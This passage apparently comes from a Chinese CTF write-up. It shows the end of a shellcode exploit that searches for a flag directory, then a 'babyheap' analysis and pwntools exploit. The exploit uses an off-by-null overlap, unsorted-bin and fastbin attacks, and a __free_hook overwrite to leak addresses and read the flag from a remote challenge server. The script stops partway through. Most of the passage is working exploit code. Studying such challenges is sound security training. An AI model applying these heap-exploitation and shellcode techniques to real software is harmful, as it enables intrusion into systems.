        mov     eax, [rbp-0x10]
        movsxd  rdx, eax
        mov     rax, [rbp-0x18]
        movzx   eax, word ptr [rax+0x10]
        movzx   eax, ax
        add     rax, rdx
        lea     rdx, [rax-1]
        lea     rax, [rbp-0x300]
        add     rax, rdx
        movzx   eax, byte ptr [rax]
        mov     [rbp-0x38], al 
    update_bpos:
        mov     rax, [rbp-0x18]
        movzx   eax, word ptr [rax+0x10]
        movzx   eax, ax
        add     [rbp-0x10], eax
    cmp_dir:
        mov     rax, [rbp-0x20]
        mov     rax, [rax]
    find_flag:
        cmp     eax, 0x67616c66
        jnz     cmp_parent
        mov     rsi, 0x60
        lea     rdi, [r15+0x500]
        mov     rax, 79
        syscall
    print_cwd:
        mov     rdi, 1
        lea     rsi, [r15+0x500]
        mov     rdx, 0x60
        mov     rax, 1
        syscall
    exit:
        mov     rax, 60
        syscall
    cmp_parent:
        cmp     al, 0x2e
        jz      loop2
        mov     r8, [rbp-0x38]
        cmp     r8, 4
        jnz     loop2
    digui:
        mov     eax, [rbp-0x40]
        lea     edx, [rax+1]
        mov     rax, [rbp-0x20]
        mov     esi, edx       
        mov     rdi, rax       
        call    find_dir
        jmp     loop2
    out_loop1:
        lea     rdi, [r15+0x320]
        mov     rax, 80
        syscall
        mov     rdi, [rbp-0x28]
        mov     rax, 3
        syscall   
        add     rbp, 0x320
        ret
        ''')
    read_sc = asm('''
    init:    
        mov     r15, rsi 
        lea     rbp, [r15+0x3900]
        lea     rdi, [r15+0x300]
        mov     rsi, 0
    open:
        mov     rax, 2
        syscall
        mov     [rbp-0x20], rax
    read:
        mov     rdx, 0x20
        lea     rsi, [r15+0x500]
        mov     rdi, [rbp-0x20]
        mov     rax, 0
        syscall
    write:
        mov     rdi, 1
        lea     rsi, [r15+0x500]
        mov     rdx, 0x20
        mov     rax, 1
        syscall
    exit:
        mov     rax, 60
        syscall
        ''')
    # find flag 
    # r.sendline(('a'*7+shellcode).ljust(0x300,'x90')+ 
    #             './flag'.ljust(0x10,'x00')+ 
    #             '.'.ljust(0x10,'x00')+ 
    #             '..'.ljust(0x10,'x00')+ 
    #             't'.ljust(0x10,'x00')+ 
    #             'n'.ljust(0x10,'x00'))            # r15+0x340
    # read flag
    cwd = '/flag/rrfh/lmc5/nswv/1rdr/zkz1/pim9'
    r.sendline(('a'*7+read_sc).ljust(0x300,'x90')+ 
                '%s/flagx00'%cwd) 
    r.interactive()
###  babyheap
**分析**
  * 程序edit功能有一个off-by-null漏洞
  * 通过off-by-null漏洞攻击方法可以构造一个重叠的堆块，能够控制已经释放的堆块
  * 利用程序show功能泄露libc地址、堆地址
  * 通过unsortbin攻击可以修改global_max_fast为很大的数，可以进行fastbin attack
  * 通过fastbin attack修改free_hook为printf函数
  * 通过修改后的free功能调用printf函数的格式化字符串漏洞泄露程序地址、栈地址
  * 通过fastbin attack修改程序全局指针指向已控制的堆块，里面的指针可以任意修改，可以任意地址读写
  * 通过edit功能在栈上构造open、read、write的rop，edit函数返回时就执行rop读取输出flag
**exp**
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-    #version 6 by tempo
    from pwn import *
    from fmt64_payload import *
    context.log_level = "debug"
    proc_name = 'babyheap.bak'
    libc_name = './libc-2.23.so' #'/lib/x86_64-linux-gnu/libc-2.23.so'
    ip_addr = "123.206.174.203:20001" #/lib32/libc-2.23.so
    local = 0
    #-------------------no change this----------------------    elf = ELF('./{}'.format(proc_name))
    if local:
        if len(libc_name) ==0:
            r = process('./{}'.format(proc_name))
            libc = r.libc
        else:
            r = process('./{}'.format(proc_name), env = {"LD_PRELOAD": libc_name})
            libc = ELF(libc_name)
        #libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
    else:
        r=remote(ip_addr.split(":")[0],ip_addr.split(":")[1])
        libc = ELF(libc_name)
    #------------------------------------------------    def add(size):
        r.sendlineafter("Choice","1")
        r.sendlineafter("Size",str(size))
    def edit(index,content):
        r.sendlineafter("Choice","2")
        r.sendlineafter("Index",str(index))
        r.sendafter("Content",str(content))
    def free(index):
        r.sendlineafter("Choice","3")
        r.sendlineafter("Index",str(index))
    def show(index):
        r.sendlineafter("Choice","4")
        r.sendlineafter("Index",str(index))
    # gdb.attach(r)
    add(0x18) #0
    add(0x500) #1
    edit(1,p64(0x500)*(0x500/8))
    add(0x80) #2
    add(0x18) #3 #用于和top_chunk分开
    free(1)
    edit(0,'a'*0x18)
    add(0x30) #1
    add(0x80) #4
    add(0x420) #5
    free(1)
    free(2) #chunk shrink
    #现在4和5是重合的，可以通过5修改这个0x430大小的堆块
    add(0x30) #1
    #show泄露地址
    show(4)
    r.recv(2)
    libc.address = u64(r.recvline(False).ljust(8,'x00')) -0x7ffff7dd1b78 + 0x7ffff7a0d000
    success("libc_addr => "+hex(libc.address))
    add(0x10) #2
    add(0x10) #6
    add(0x10) #7
    free(7)
    free(2)
    show(4)
    r.recv(2)
    heap_addr = u64(r.recvline(False).ljust(8,'x00')) - 0x5555557570a0 + 0x0000555555757000
    success("heap_addr => "+hex(heap_addr)) 
    free(6)
    add(0x90) #2
    #通过unsortbin attack修改global_max_fast为一个很大的值main_arena+0x58
    max_addr = libc.address - 0x7ffff7a0d000 + 0x7ffff7dd37f8
    add(0x20) #6 和5是同一块
    add(0x60) #7
    add(0x410) #8
    free(6)
    payload = p64(0)+ p64(0x31) + p64(0) +p64(max_addr-0x10)
    edit(5,payload)
    add(0x20) #6
    # 通过fastbin_attack修改free_hook为prinf
    free_hook = libc.sym['__free_hook']
    fake_addr = free_hook -0x108b-8
    free(7)
    payload = p64(0)+ p64(0x31) + 'x00'*0x20
    payload += p64(0) +p64(0x71) + p64(fake_addr)
    edit(5,payload)
    add(0x60) #7
    add(0x60) #9 用来伪造size，在free_hook上方
    payload = 'x00'*3 + 'x00'*0x48+ p64(0x421)
    edit(9,payload)
    fake_addr = fake_addr+0x53
    free(8)
    payload = p64(0)+ p64(0x31) + 'x00'*0x20
    payload += p64(0) + p64(0x71) + 'x00'*0x60
    payload += p64(0) + p64(0x421) + p64(fake_addr)
    edit(5,payload) #修改0x880chunk的fd
    add(0x410) #8